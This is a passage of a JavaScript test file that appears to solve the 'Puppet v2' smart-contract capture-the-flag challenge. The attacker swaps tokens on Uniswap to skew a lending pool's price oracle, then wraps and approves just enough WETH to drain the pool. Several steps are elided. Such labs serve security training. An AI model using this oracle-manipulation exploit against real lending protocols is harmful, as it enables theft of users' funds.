...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        // let getEthRequiredBefore = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(parseFloat(await ethers.provider.getBalance(attacker.address)))
        console.log(parseFloat(await  this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)))
        this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapRouter.connect(attacker) // intial reserve price was 100 dvt and 10 eth,
        ...
        let wethDepositRequired = await  this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        // console.log(parseFloat(wethDepositRequired))
        // console.log(parseFloat(await ethers.provider.getBalance(attacker.address)))

        this.weth.connect(attacker).deposit({value: wethDepositRequired})
        this.weth.connect(attacker).approve(this.lendingPool.address, wethDepositRequired)
